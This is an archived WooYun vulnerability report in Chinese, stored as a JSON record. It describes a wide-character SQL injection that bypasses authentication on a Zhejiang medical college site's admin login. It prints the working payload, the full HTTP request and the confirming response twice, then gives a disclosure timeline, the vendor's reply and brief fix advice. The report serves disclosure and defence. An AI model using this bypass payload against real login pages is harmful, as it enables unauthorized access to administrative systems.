{"id": 70310, "wybug_id": "wooyun-2015-0135766", "wybug_title": "浙江医学院后台注入", "wybug_corp": "浙江医学院", "wybug_author": "慢跑", "wybug_date": "2015-08-21 11:41", "wybug_open_date": "2015-10-08 08:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向公众公开  简要描述： 浙江医学院官方网站www.cmm.zju.edu.cn后台登录页面存在宽字符sql注入漏洞，可直接绕过账号密码检测进入后台 详细说明：  1、userId字段插入绕过字符%df%27%20or%201=1%20%23GET /admin/inc/checkUser.php?userId=admin%df%27%20or%201=1%20%23&password=11 HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/admin/login.phpCookie: Hm_lvt_197a6e66df85f3c2f2bfb813a70dab0c=1439994485,1439994584,1439994735,1440000435; PHPSESSID=p847hlu1plbcc4h4p2a79vnre6Connection: keep-alive2、返回字符1，说明通过登录认证HTTP/1.1 200 OKDate: Thu, 20 Aug 2015 16:46:18 GMTServer: Apache/2.2.21 (Win32) PHP/5.2.17X-Powered-By: PHP/5.2.17Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-cache, must-revalidatePragma: no-cacheLast-Modified: Thu, 20 Aug 2015 16:46:18 GMTContent-Length: 1Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/html;charset=gb231213、进入后台页面\n\n   漏洞证明：  1、userId字段插入绕过字符%df%27%20or%201=1%20%23GET /admin/inc/checkUser.php?userId=admin%df%27%20or%201=1%20%23&password=11 HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/admin/login.phpCookie: Hm_lvt_197a6e66df85f3c2f2bfb813a70dab0c=1439994485,1439994584,1439994735,1440000435; PHPSESSID=p847hlu1plbcc4h4p2a79vnre6Connection: keep-alive2、返回字符1，说明通过登录认证HTTP/1.1 200 OKDate: Thu, 20 Aug 2015 16:46:18 GMTServer: Apache/2.2.21 (Win32) PHP/5.2.17X-Powered-By: PHP/5.2.17Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-cache, must-revalidatePragma: no-cacheLast-Modified: Thu, 20 Aug 2015 16:46:18 GMTContent-Length: 1Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/html;charset=gb231213、进入后台页面\n\n   修复方案：  过滤 转义  预处理   版权声明：转载请注明来源 慢跑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-08-24 08:28 厂商回复： 通知用户处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}